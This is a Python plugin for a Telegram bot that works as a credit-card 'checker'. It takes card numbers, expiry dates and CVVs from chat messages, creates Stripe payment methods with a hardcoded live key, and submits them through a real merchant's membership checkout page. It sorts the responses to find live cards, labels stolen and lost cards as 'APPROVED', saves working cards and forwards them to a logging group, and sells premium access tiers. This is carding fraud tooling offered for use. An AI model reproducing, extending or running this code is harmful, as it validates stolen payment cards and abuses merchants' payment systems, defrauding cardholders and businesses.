import time
from pyrogram import Client
import requests

import re
# import bs4
from values import *
from pyrogram import Client, filters
import json

headers = {
    'authority':'www.voclr.it',
    'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/',
    'accept-language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
    'content-type':'application/x-www-form-urlencoded',
    'cookie':'PHPSESSID=97976bceefac3464ffa1871df2a27c76',
    'origin':'https://www.voclr.it',
    'referer':'https://www.voclr.it/membership-account/membership-checkout/',
    'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36'}





@Client.on_message(filters.command(["ch","chk"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
async def ch(Client, message):
    try:
        started_time = time.time()
        banned_bins = open('files/bannedbin.txt', 'r').readlines()
        verified_gps = open('files/groups.txt', 'r').readlines()
        if (str(message.chat.id) + "\n" not in verified_gps and message.chat.type != "private"):
            print(verified_gps)
            await message.reply_text(text= group_not_allowed,reply_to_message_id=message.message_id)
        else:
            text = f"""
<b>〄</b> GATE: <b>STRIPE FREE [2]</b>
<b>○</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
            msg = await message.reply_text(text=text,reply_to_message_id=message.message_id)
            await Client.send_chat_action(message.chat.id, "typing")
            find = maindb.find_one({"_id": message.from_user.id})
            if isinstance(find, type(None)) == True:
                await msg.edit_text(use_not_registered)
            elif find['status'] == "F" and message.chat.type == 'private':
                await msg.edit_text(buy_premium)
            else:
                antispam_time = int(antidb.get(message.from_user.id).decode("utf-8"))
                spam_time = int(time.time()) - antispam_time
                role = find["status"]
                if role == "P" and spam_time < 10:
                    time_left = 10 - spam_time
                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
                elif role == "F" and spam_time < 60:
                    time_left =  60 - spam_time
                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
                else:
                    if message.reply_to_message is not None:
                        message.text = message.reply_to_message.text
                    input = re.findall(r"[0-9]+", message.text)
                    try:
                        if len(input) == 0:
                            raise ValueError
                        cc = input[0]
                        mes = input[1]
                        ano = input[2]
                        ano1 = input[2]
                        cvv = input[3]
                        if len(input) == 3:
                            cc = input[0]
                            mes = input[1][:2]
                            ano = input[1][2:]
                            ano1 = input[1][2:]
                            cvv = input[2]
                        if len(mes) > 2:
                            ano = cvv
                            cvv = mes
                            mes = ano1
                    except IndexError as e:
                            await msg.edit_text("Your Card Is Incorrect.")
                    except ValueError as e:
                            await msg.edit_text("Your Card Is Empty.")
                    except Exception as e:
                            await Client.send_message(chat_id=loggp, text=e)
                    else:
                        if int(cc[0]) in waste_cards:
                            await msg.edit_text("Your Card Is Invalid.")
                        elif int(len(cc))not in [15,16]:
                            await msg.edit_text("Your Card Is To Short.")
                        elif int(len(mes)) not in [2,4] or len(mes) == 2 and mes > '12' or len(mes) == 2 and mes < '01' or len(mes) != 2:
                            await msg.edit_text("Your Card Month Is Incorrect.")
                        elif int(len(ano)) not in [2,4] or len(ano) < 2  or len(ano) == 2 and ano < '21' or len(ano)  == 4 and ano < '2021' or len(ano) == 2 and ano > '29' or len(ano)  == 4 and ano > '2029' or len(ano) > 4 or len(ano) == 3:
                            await msg.edit_text("Your Card Year Is Incorrect.")
                        elif int(cc[0]) == 3 and len(cvv) != 4 or len(cvv) < 3 or len(cvv) > 4:
                            await msg.edit_text("Your Card Cvv Is Incorrect.")
                        else: 
                            lista = cc + "|" + mes + "|" + ano + "|" + cvv
                            bin = cc[:6]
                            res = requests.get("https://adyen-enc-and-bin-info.herokuapp.com/bin/" + bin)
                            if res.status_code != requests.codes.ok or json.loads(res.text)['result'] == False:
                                await msg.edit_text("Your Card Is Invalid.")
                            elif str(bin) + "\n"in banned_bins:
                                await msg.edit_text("Your Card Is Banned.")
                            else:
                                bin_data = json.loads(res.text)
                                vendor = bin_data["data"]["vendor"].lower()
                                curl =  requests.Session()
                                res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
                                random_data = json.loads(res.text)
                                # phone_number = "225"+ "-" + str(random.randint(111,999))+ "-" +str(random.randint(0000,9999))
                                # first_name = random_data['results'][0]['name']['first']
                                # last_name = random_data['results'][0]['name']['last']
                                # street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name']
                                # city = random_data['results'][0]['location']['city']
                                # state = random_data['results'][0]['location']['state']
                                # zip = random_data['results'][0]['location']['postcode']
                                email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
                                password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
                                data = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F583319551%3B+stripe-js-v3%2F583319551&time_on_page=69254&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_16WRSqINWTSGTB2G"
                                res = curl.post("https://api.stripe.com/v1/payment_methods",headers=sk_headers,data=data)
                                json_first = json.loads(res.text)
                                if 'error' in json_first:
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE FREE [2]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED❌ [INCORRECT CARD]</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    antidb.set(message.from_user.id, int(time.time()))
                                elif 'id' not in json_first:
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE FREE [2]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED❌ [ERROR]</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    antidb.set(message.from_user.id, int(time.time()))
                                else:
                                    id = json_first["id"]
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE FREE [2]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> PROCESS: <b>■■■■■□□□□□ 50%</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    data = f"level=1&checkjavascript=1&other_discount_code=&username={get_username()}&password={password}&password2={password}&bemail={email}&bconfirmemail={email}&fullname=&gateway=stripe&CardType={vendor}&discount_code=&submit-checkout=1&javascriptok=1&submit-checkout=1&javascriptok=1&payment_method_id={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear={ano}"
                                    res = curl.post("https://www.voclr.it/membership-account/membership-checkout/",headers=headers,data=data)
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE FREE [2]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: <b>{get_time_taken(started_time)}'s</b>
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    try:
                                        if 'incorrect_zip' in res.text or 'Your card zip code is incorrect.' in res.text or 'The zip code you supplied failed validation' in res.text or 'card zip code is incorrect' in res.text: 
                                            await Client.send_message(chat_id=loggp,text=str(lista) + " #ZIP")
                                            response = "CVV LIVE"
                                            r_logo = "✅"
                                            r_text = 'ZIP INCORRECT'
                                        elif '"cvc_check":"pass"' in res.text or '"cvc_check":"success"' in res.text or "Thank You." in res.text or '"status": "succeeded"' in res.text or "Thank You For Donation." in res.text or "Your payment has already been processed" in res.text or "Success " in res.text or '"type":"one-time"' in res.text or "/donations/thank_you?donation_number=" in res.text or '"status": "complete"' in res.text or '"status": "cahrged"' in res.text or '"status": "suceess"' in res.text or '"status": "thanks"' in res.text or '"status": "successufulty"' in res.text or '"status": "thaks for your donation."' in res.text or '"status": "save"' in res.text or '"status": "pass"' in res.text or '"status": "true"' in res.text or '"status": "valid"' in res.text or '"status": "null"' in res.text or '"status": "complete"' in res.text or '"status": "validated"' in res.text or '"status": "successufll"' in res.text or '"status": "succefulity"' in res.text or "Payment complete" in res.text or '"cvc_check": "complete"' in res.text or '"cvc_check": "cahrged"' in res.text or '"cvc_check": "suceess"' in res.text or '"cvc_check": "thanks"' in res.text or '"cvc_check": "successufulty"' in res.text or '"cvc_check": "thaks for your donation."' in res.text or '"cvc_check": "save"' in res.text or '"cvc_check": "pass"' in res.text or '"cvc_check": "true"' in res.text or '"cvc_check": "valid"' in res.text or '"cvc_check": "null"' in res.text or '"cvc_check": "complete"' in res.text or '"cvc_check": "validated"' in res.text or '"cvc_check": "successufll"' in res.text or '"cvc_check": "succefulity"' in res.text or "Payment complete" in res.text or "fraudulent, LIVE" in res.text or "cvv_charged" in res.text or "cvv_not_charged" in res.text or '"seller_message": "Payment complete."' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or '"status": "succeeded"' in res.text or 'donation_number=' in res.text : #or 'donation_number=' in res.text
                                            save_live(lista)
                                            await Client.send_message(chat_id=loggp,text=str(lista) + " #CVV")
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "CVV MATCH"                                            
                                        elif "card has insufficient funds" in res.text or 'insufficient_funds' in res.text or 'Insufficient Funds' in res.text :
                                            save_live(lista)
                                            await Client.send_message(chat_id=loggp,text=str(lista) + " Insufficient")
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "LOW BALANCE"
                                        elif "pickup_card" in res.text or 'Pickup Card' in res.text or 'pickup card' in res.text: 
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "PICKUP CARD"
                                        elif "stolen_card" in res.text or 'stolen Card' in res.text or 'stolen card' in res.text: 
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "STOLEN CARD"
                                        elif "lost_card" in res.text or 'Lost Card' in res.text or 'lost card' in res.text: 
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "LOST CARD"
                                        elif "card's security code is incorrect" in res.text or "card&#039;s security code is incorrect" in res.text or "security code is invalid" in res.text or 'CVC was incorrect' in res.text or "incorrect CVC" in res.text or 'cvc was incorrect' in res.text or 'Card Issuer Declined CVV' in res.text :
                                            save_ccn(lista)
                                            await Client.send_message(chat_id=loggp,text=str(lista) + " #CCN")
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "CVC MISMATCH"
                                        elif "card does not support this type of purchase" in res.text or 'transaction_not_allowed' in res.text or 'Transaction Not Allowed' in res.text: 
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "PURCHASE NOT ALLOWED"
                                        elif "card number is incorrect" in res.text or 'incorrect_number' in res.text or 'Invalid Credit Card Number' in res.text or 'card number is incorrect' in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "CARD INCORRECT"
                                        elif "Customer authentication is required" in res.text or "unable to authenticate" in res.text or "three_d_secure_redirect" in res.text or "hooks.stripe.com/redirect/" in res.text or 'requires an authorization' in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "3D SECURITY"
                                        elif "card was declined" in res.text or 'card_declined' in res.text or 'The transaction has been declined' in res.text or 'Processor Declined' in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "CARD DECLINED"
                                        elif 'Do Not Honor' in res.text :
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "NO NOT HONOR"
                                        elif "card has expired" in res.text or 'Expired Card' in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "CARD EXPIRED"
                                        else:
                                            response = 'ERROR'
                                            r_logo = '❌'
                                            r_text = 'UNKOWN RESPONSE'  
                                    except Exception as e:
                                        await Client.send_message(chat_id=loggp, text=e)
                                    else:
                                        if response is None:
                                            await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER @r0ld3x")
                                        else:
                                            lasttext = f"""
<b>〄</b> GATE: <b>STRIPE FREE [2]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>{response}{r_logo} [{r_text}]</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKEN: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                        await msg.edit_text(lasttext)
                                        antidb.set(message.from_user.id, int(time.time()))
    
    except Exception as e:
        await Client.send_message(chat_id=loggp, text=e)
        print(e)
